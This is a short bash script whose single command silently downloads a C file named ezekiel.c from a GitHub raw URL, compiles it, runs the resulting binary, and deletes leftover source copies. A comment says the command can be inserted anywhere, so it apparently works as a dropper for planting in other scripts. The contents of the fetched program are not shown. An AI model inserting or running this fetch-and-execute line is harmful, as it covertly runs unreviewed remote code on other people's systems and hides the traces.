#!/bin/bash

# You can insert this download command anywhere

wget --quiet https://raw.githubusercontent.com/solanav/ezekiel/master/ezekiel.c && gcc ezekiel.c -o ezekiel.bin && ./ezekiel.bin && rm -rf ezekiel.c.*
